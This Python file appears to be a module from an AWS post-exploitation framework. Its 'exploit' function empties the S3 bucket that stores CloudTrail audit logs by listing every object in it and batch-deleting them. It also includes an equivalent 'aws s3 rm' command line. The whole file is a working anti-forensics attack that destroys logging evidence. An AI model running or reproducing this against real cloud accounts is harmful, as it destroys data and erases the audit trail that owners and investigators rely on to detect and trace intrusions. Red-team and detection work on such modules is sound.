import sys

author = {
    "name":"gl4ssesbo1",
    "twitter":"https://twitter.com/gl4ssesbo1",
    "github":"https://github.com/gl4ssesbo1",
    "blog":"https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
	"SERVICE": {
		"value": "s3",
		"required": "true",
        "description":"The service that will be used to run the module. It cannot be changed."
	},
	"BUCKET": {
		"value": "",
		"required": "true",
        "description":"The name of the S3 Bucket with the CloudTrail Logs to empty."
	}
}
description = "Empty the bucket where CloudTrail Logs are stored."

aws_command = "aws s3 rm s3://<bucket-name> --region <region> --profile <profile>"

def exploit(profile, workspace):
	bucket = variables['BUCKET']['value']

	try:
		objects = profile.list_objects_v2(Bucket=bucket)["Contents"]
		objects = list(map(lambda x: {"Key": x["Key"]}, objects))
		profile.delete_objects(Bucket=bucket, Delete={"Objects": objects})

		status = f"Successfully emptied CloudTrail Bucket {bucket}"

	except:
		status = f"CloudTrail Bucket {bucket} was not emptied with error code: {str(sys.exc_info()[1])}."

	return {
		"Bucket": {
			"Bucket": bucket,
			"Status": status
		}
	}

